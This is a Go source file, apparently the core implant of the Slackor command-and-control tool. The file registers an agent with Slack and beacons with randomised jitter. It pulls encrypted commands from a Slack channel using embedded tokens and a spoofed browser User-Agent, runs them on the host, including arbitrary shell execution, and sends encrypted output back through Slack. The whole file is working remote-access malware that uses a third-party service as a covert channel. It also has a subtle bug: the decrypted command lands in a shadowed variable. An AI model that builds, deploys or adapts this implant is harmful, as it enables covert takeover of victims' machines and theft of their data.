package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/Coalfire-Research/Slackor/internal/config"
	"github.com/Coalfire-Research/Slackor/internal/crypto"
	"github.com/Coalfire-Research/Slackor/internal/slack"
	"github.com/Coalfire-Research/Slackor/pkg/command"

	_ "github.com/Coalfire-Research/Slackor/pkg/common"
	_ "github.com/Coalfire-Research/Slackor/pkg/darwin"
	_ "github.com/Coalfire-Research/Slackor/pkg/linux"
	_ "github.com/Coalfire-Research/Slackor/pkg/windows"

	"github.com/mattn/go-shellwords"
)

// processedJobIDs tracks all job IDs previously processed by the implant
var processedJobIDs = []string{}

func checkErr(err error) { //Checks for errors
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func RandomString(len int) string { //Creates a random string of uppercase letters
	bytes := make([]byte, len)
	for i := 0; i < len; i++ {
		bytes[i] = byte(65 + rand.Intn(25)) //A=65 and Z = 65+25
	}
	return string(bytes)
}

func randomFloat(min, max float64, n int) []float64 { //Creates a random float between to numbers
	rand.Seed(time.Now().UnixNano())
	res := make([]float64, n)
	for i := range res {
		res[i] = min + rand.Float64()*(max-min)
	}
	return res
}

func stringInSlice(a string, list []string) bool { // A way to check if something is in the slice
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func makeTimestamp(beacon int) string { //This makes the unix timestamp
	t := time.Now().UnixNano() / int64(time.Microsecond)
	//Minus the beacon time and three seconds from the last time it ran
	t = (t / 1000000) - 3 - int64(beacon)
	tee := fmt.Sprint(t)
	return tee
}

func GetLANOutboundIP() string { // Get preferred outbound ip of this machine
	conn, err := net.Dial("udp", "4.5.6.7:1337") //This doesn't actually make a connection
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	IP := localAddr.IP.String()
	return IP

}

func getVersion() string {
	versionCmd := command.GetCommand("version")
	if versionCmd != nil {
		result, _ := versionCmd.Run("", "", []string{})
		if result != "" {
			return result
		}
		return "OS versioning error"
	} else {
		return "OS versioning unavailable"
	}
}

func CheckCommands(t, clientID string) { //This is the main thing, reads the commands channel and acts accordingly
	client := &http.Client{}
	URL := "https://slack.com/api/channels.history"
	v := url.Values{}
	v.Set("channel", config.CommandsChannel)
	v.Set("token", config.Token)
	v.Set("oldest", t)
	//pass the values to the request's body
	req, _ := http.NewRequest("POST", URL, strings.NewReader(v.Encode()))
	req.Header.Add("Authorization", "Bearer "+config.Bearer)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	resp, netError := client.Do(req)
	if netError != nil {
		fmt.Println("Connection error: " + netError.Error())
		return
	}
	bodyText, _ := ioutil.ReadAll(resp.Body)
	s := string(bodyText)
	fmt.Println(s) //Just for debugging

	type Auto struct { //This structure is for parsing the JSON
		Ok       bool   `json:"ok"`
		Error    string `json:"error"`
		Messages []struct {
			Type        string `json:"type"`
			User        string `json:"user,omitempty"`
			Text        string `json:"text"`
			ClientMsgID string `json:"client_msg_id,omitempty"`
			Ts          string `json:"ts"`
			Username    string `json:"username,omitempty"`
			BotID       string `json:"bot_id,omitempty"`
			Subtype     string `json:"subtype,omitempty"`
		} `json:"messages"`
		HasMore bool `json:"has_more"`
	}
	var m Auto
	json.Unmarshal([]byte(s), &m)
	// If the error string exists, you are probably rate limited.  Sleep it off.
	if m.Error != "" {
		fmt.Println("Rate Limited, Sleeping for a bit...")
		time.Sleep(time.Duration(randomFloat(1, 30, 1)[0]) * time.Second)
	}
	//This loops through each message
	for _, Message := range m.Messages {
		// this splits the different parts of the message
		stringSlice := strings.Split(Message.Text, ":")
		audienceID := stringSlice[0]
		jobID := stringSlice[1]
		cmdType := stringSlice[2]
		encCmd := stringSlice[3]
		// If the audienceID is for me (or all agents)
		if audienceID == clientID || audienceID == "31337" {
			// And this job has not yet been processed
			if !stringInSlice(jobID, processedJobIDs) {
				// append processed ID to the list of processed jobs
				processedJobIDs = append(processedJobIDs, jobID)
				fmt.Println(processedJobIDs)
				/// Run stuff based on type
				data := []byte{}
				if encCmd != "" {
					data, err := crypto.Decrypt(encCmd)
					if err != nil {
						fmt.Println("error:" + err.Error())
						continue
					}
					fmt.Printf("%q\n", data)
				}
				cmdParser := shellwords.NewParser()
				cmdParser.ParseEnv = config.ParseEnv
				cmdParser.ParseBacktick = config.ParseBacktick
				args, err := cmdParser.Parse(string(data))
				if err != nil {
					fmt.Println("error:" + err.Error())
					continue
				}

				switch cmdType {
				case "command":
					go RunCommand(clientID, jobID, args)
				default:
					cmd := command.GetCommand(cmdType)
					var result string
					if cmd != nil {
						result, err = cmd.Run(clientID, jobID, args)
						if err != nil {
							result = err.Error()
						}
					} else {
						result = fmt.Sprintf("%s command unavailable", cmdType)
					}
					encryptedOutput, _ := crypto.Encrypt([]byte(result))
					slack.SendResult(clientID, jobID, "output", encryptedOutput)
				}
			}
		}
	}
	return
}

func RunCommand(clientID string, jobID string, args []string) { //This receives a command to run and runs it
	var err error

	cmdName := args[0]
	var cmdArgs []string
	cmd := command.GetCommand(cmdName)
	if cmd != nil {
		cmdArgs = args[1:]
	} else {
		cmdName = "execute"
		cmd = command.GetCommand("execute")
		cmdArgs = args
	}
	var result string
	if cmd != nil {
		result, err = cmd.Run(clientID, jobID, cmdArgs)
		if err != nil {
			result = err.Error()
		}
	} else {
		result = fmt.Sprintf("%s command unavailable", cmdName)
	}
	encryptedOutput, _ := crypto.Encrypt([]byte(result))
	slack.SendResult(clientID, jobID, "output", encryptedOutput)
}

func main() { //Main function
	// Set config.OSVersion
	cmd := command.GetCommand("version")
	if cmd != nil {
		cmd.Run("", "", []string{})
	}

	//Give the client a random ID
	rand.Seed(time.Now().UTC().UnixNano())
	clientID := RandomString(5)
	// Register with server
	slack.Register(clientID)
	for {
		// 20% Jitter
		delay := randomFloat(float64(config.Beacon)*.8, float64(config.Beacon)*1.2, 1)
		fmt.Println(delay) // Just for debugging
		//Sleep for beacon interval + jitter
		time.Sleep(time.Duration(delay[0]) * time.Second)
		t := makeTimestamp(config.Beacon)
		//Check if commands are waiting for us
		CheckCommands(string(t), clientID)
	}
}
